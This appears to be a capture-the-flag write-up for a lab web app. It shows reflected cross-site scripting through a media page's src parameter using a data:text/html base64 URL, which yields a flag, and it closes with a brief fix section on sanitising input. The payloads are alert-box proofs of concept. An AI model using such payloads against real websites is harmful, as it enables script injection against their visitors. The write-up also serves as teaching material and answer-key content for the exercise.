# XSS on URL

### Breach description

One of the images has its source in the url and is then displayed within an object, this gives us the opportunity to manipulate it, in order to execute some javascript instead of displaying the picture when a user follows the link:

```bash
[http://WEBSITE_IP/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==](http://192.168.64.4/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
```

instead of the intended link:

```jsx
http://WEBSITE_IP/?page=media&src=nsa
```

the following code will be executed:

```jsx
<script>alert(1)</script>
```

and the following flag given:

**The flag is : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D**

### Explanation of the breach

Mechanism

- When a user visits the manipulated URL, the browser interprets the **`src`** value as HTML content (due to the **`data:text/html;base64,`** prefix) and executes the JavaScript code.

This also works without encoding the data in base 64 and makes the exploit easier to understand, but will not give you a flag 😞

```jsx
[http://WEBSITE_IP/?page=media&src=data:text/html,](http://192.168.64.4/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)<script>alert('hello corrector')</script>
```

We basically just specify what the object data should be interpreted as, in this case html, then put a script in this html and this will be executed.

### Breach Fix

Sanitising the src parameter could be a good first step, escaping chars to keep user input from being interpreted for example, not using an object tag would not eliminate the potential for an xss but would perhaps reduce its flexibility. Not placing the src in the url would seem wise.
